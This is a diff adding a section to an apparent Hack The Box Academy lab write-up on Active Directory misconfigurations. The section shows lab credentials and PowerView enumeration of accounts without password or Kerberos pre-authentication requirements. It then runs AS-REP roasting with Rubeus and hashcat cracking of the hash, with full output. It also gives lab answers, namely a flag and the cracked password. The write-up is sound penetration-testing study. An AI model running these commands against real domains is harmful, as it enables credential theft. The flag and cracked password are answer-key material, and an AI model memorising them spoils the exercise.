@@ -825,3 +825,106 @@ From the shell, I navigated to the Administrator's desktop and retrieved the fla
 C:\Windows\system32> type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
 D0ntSl@ckonN0P@c!
 ```
+
+## Miscellaneous Misconfigurations
+
+> RDP to 10.129.43.61 (ACADEMY-EA-MS01) ,10.129.57.31 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "Academy_student_AD!"
+
+* **Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".**
+
+I initiated an RDP connection to the target Windows host 10.129.146.13 using xfreerdp with the provided credentials:
+
+```c 
+xfreerdp /v:10.129.146.13 /u:htb-student /p:Academy_student_AD!
+```
+
+Once connected, I launched PowerShell with administrative privileges and executed:
+
+```c
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools>  Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+
+samaccountname                                                           useraccountcontrol
+--------------                                                           ------------------
+guest                  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+mlowe                                  PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+ygroce               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+ehamilton                              PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+$725000-9jb50uejje9f                         ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
+nagiosagent                                                  PASSWD_NOTREQD, NORMAL_ACCOUNT
+```
+
+* **Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.**
+
+For this question I executed the following command to enumerate for DONT_REQ_PREAUTH Value using Get-DomainUser:
+
+```c
+ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+
+samaccountname     : ygroce
+userprincipalname  : ygroce@inlanefreight.local
+useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+
+samaccountname     : mmorgan
+userprincipalname  : mmorgan@inlanefreight.local
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+```
+
+I then retrieved the AEP hash using Rubeus with: 
+```c
+PS C:\Tools> .\Rubeus.exe asreproast /user:ygroce  /nowrap /format:hashcat
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : ygroce
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=ygroce))'
+[*] SamAccountName         : ygroce
+[*] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
+[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\ygroce'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:8A5C4538162FA97BB71272FD5A2BA318$EC6EA2BB90CDC3253CC4E2C0DC36B460306B37C7B5FB09E797D0B2590B7EEDB520270E1F293FE8511DB4BECEDBB4146DE0FE787DEC026F4C9A620B0D541BDD690DD92DC728E8E5D3098323703C560E177FB0B5252FE02CD35ECB1A5DE5BD101DEECE54CD0E3BAF550661A45A79CB9B0E30F009A1D3A45150B09F4A90D3BECD6A29C0DCB671033A2B265E3AC4620F0250F9D4CF79898EFFCC974082F519ECC69E8A6141207D1AB33F3411CD9ECB4B190A590A071A45C22F0206017F7E595E08927B56AEFF1DF11EA3F796102C2347A8F2D31E5363E6BBD3EE57B2E2B1F7E2E8587CCA1EAA282B70BFCAE577F74A67278F1B33061C21DB701A41DF
+
+ ```
+
+Finally I copied the hash into the attacking host and used hashcat to crack it. 
+
+```c
+ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+<snip>
+Host memory required for this attack: 1 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:8a5c4538162fa97bb71272fd5a2ba318$ec6ea2bb90cdc3253cc4e2c0dc36b460306b37c7b5fb09e797d0b2590b7eedb520270e1f293fe8511db4becedbb4146de0fe787dec026f4c9a620b0d541bdd690dd92dc728e8e5d3098323703c560e177fb0b5252fe02cd35ecb1a5de5bd101deece54cd0e3baf550661a45a79cb9b0e30f009a1d3a45150b09f4a90d3becd6a29c0dcb671033a2b265e3ac4620f0250f9d4cf79898effcc974082f519ecc69e8a6141207d1ab33f3411cd9ecb4b190a590a071a45c22f0206017f7e595e08927b56aeff1df11ea3f796102c2347a8f2d31e5363e6bbd3ee57b2e2b1f7e2e8587cca1eaa282b70bfcae577f74a67278f1b33061c21db701a41df:Pass@word
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:8a5c453816...1a41df
+Time.Started.....: Mon Mar 24 13:58:12 2025 (6 secs)
+Time.Estimated...: Mon Mar 24 13:58:18 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+<snip>
+```c
